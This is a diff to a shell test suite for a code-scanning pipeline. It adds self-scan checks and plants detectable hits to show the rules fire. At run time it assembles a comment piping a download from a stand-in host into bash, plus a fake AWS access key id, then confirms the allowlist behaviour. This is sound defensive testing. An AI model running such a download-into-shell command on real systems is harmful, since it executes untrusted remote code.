@@ -4730,6 +4730,33 @@ PY
         fi
     done
 
+    # The pipeline reads its own sources like any repository, and a rule definition holds what it detects, so a pattern for a
+    # download piped into a shell used to trip itself (and so did the documents that quoted it). tests/selfmatch.py applies the
+    # engine's FAIL-level grep rules, and the default gitleaks and semgrep expressions for an AWS key and a PGP block, to the
+    # project sources, and exits 1 on a hit that .transit-allow.json does not cover. The three checks after the first one make it
+    # non-vacuous: each plants a hit in a copy of a source (assembled here at run time, so this file holds none) and needs it found.
+    if SELF_OUT=$(cd "$ROOT_DIR" && python3 -I tests/selfmatch.py 2>&1); then
+        ok_test "the project's own sources scan clean under the pipeline's own FAIL rules (tests/selfmatch.py)"
+    else
+        fail_test "the project's own sources scan clean under the pipeline's own FAIL rules (tests/selfmatch.py)" "$SELF_OUT"
+    fi
+    SELF_P="${SCRATCH}/selfmatch_planted"; mkdir -p "$SELF_P"
+    cp "${ROOT_DIR}/scan_pipeline.sh" "${SELF_P}/scan_pipeline.sh"
+    printf '# curl http://x.example/a | %s\n' bash >> "${SELF_P}/scan_pipeline.sh"
+    SELF_OUT=$(cd "$ROOT_DIR" && python3 -I tests/selfmatch.py --root "$SELF_P" --files scan_pipeline.sh 2>&1 || true)
+    assert_contains "$SELF_OUT" "scan_pipeline.sh: FAIL CWE-78:remote_code_execution_curl_pipe_bash" \
+        "selfmatch finds a planted download-piped-into-a-shell line (the guard is not vacuous)"
+    SELF_K="${SCRATCH}/selfmatch_planted_key"; mkdir -p "$SELF_K"
+    cp "${ROOT_DIR}/CLAUDE.md" "${SELF_K}/CLAUDE.md"
+    printf 'key: AKIA%s\n' QYLPMN5HHHFPZAM2 >> "${SELF_K}/CLAUDE.md"
+    SELF_OUT=$(cd "$ROOT_DIR" && python3 -I tests/selfmatch.py --root "$SELF_K" --files CLAUDE.md 2>&1 || true)
+    assert_contains "$SELF_OUT" "CLAUDE.md: FAIL gitleaks:aws-access-token" \
+        "selfmatch finds a planted AWS key id, which no per-path allowlist can cover"
+    printf '[{"rule": "CWE-78", "path": "scan_pipeline.sh", "reason": "planted by the test"}]\n' > "${SELF_P}/.transit-allow.json"
+    SELF_OUT=$(cd "$ROOT_DIR" && python3 -I tests/selfmatch.py --root "$SELF_P" --files scan_pipeline.sh 2>&1 || true)
+    assert_contains "$SELF_OUT" "selfmatch: 1 file(s), 0 FAIL-level hit(s)" \
+        "selfmatch drops a hit that .transit-allow.json allows for that rule and path"
+
     # Documentation quotes the assertion count ("68/68 passed", "68 assertions")
     # in several places. Those numbers drift silently every time a test is added,
     # and a doc that misstates its own verification is a doc readers stop
